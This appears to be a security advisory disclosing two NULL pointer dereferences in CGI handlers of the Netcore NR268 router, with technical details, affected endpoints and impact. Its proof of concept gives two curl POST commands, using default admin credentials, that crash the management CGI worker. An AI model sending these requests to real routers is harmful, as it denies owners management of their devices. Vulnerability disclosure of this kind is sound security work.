# Netcore NR268 NULL Pointer Dereference via Missing Request Parameters

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** NULL Pointer Dereference (CWE-476)  
**Credits:** Zhou Ao, Yin Luxing, Jiang Yuxuan, Liu Xin, @Nebusec

## Summary

`attack_auto_status_set_cgi` never verifies `attack_system` before calling `atoi()`, and `host_conn_limit_add_cgi` dereferences `*deal` without checking that the form field exists. Incomplete authenticated POSTs crash the CGI worker and deny management actions.

## Technical Details

`attack_auto_status_set_cgi` reads four form values but only checks `attack_hard`, `attack_driver`, and `attack_application` before entering the success path. It then calls `atoi(v8)` even though `v8` came from `get_form_value(..., "attack_system")` and was never validated. If `attack_system` is omitted, the handler reaches `atoi(NULL)`.

`host_conn_limit_add_cgi` reads `deal` into `form_value` and validates the other fields, but never checks that `form_value` is non-null before executing `v12 = *form_value`. Omitting `deal` is a direct NULL dereference in the handler.

### Affected Endpoint

- URL: `/router/attack_auto_status_set.cgi`, `/router/host_conn_limit_add.cgi`
- Parameters: `attack_auto_status_set.cgi` requires `attack_system`; `host_conn_limit_add.cgi` requires `deal`
- Method: POST
- Authentication: HTTP Basic authentication

## Proof of Concept

```bash
# omit attack_system
curl -sv -u admin:admin -X POST "http://192.168.1.1/router/attack_auto_status_set.cgi" \
  -d "attack_hard=1&attack_driver=1&attack_application=1"

# omit deal
curl -sv -u admin:admin -X POST "http://192.168.1.1/router/host_conn_limit_add.cgi" \
  -d "ip_start=192.168.0.10&ip_end=192.168.0.10&max_num=1&mode=0"
```

### Outcome

The CGI worker crashes, resets the connection, or returns an abruptly broken response instead of a normal validation error. The `host_conn_limit_add.cgi` case is the clearer proof because the handler itself executes `*form_value` after loading `deal` with no NULL check.

## Impact

- **Confidentiality:** Low
- **Integrity:** Low
- **Availability:** High – denial of management actions on the affected routes

An authenticated user can crash the CGI worker by omitting a required parameter.
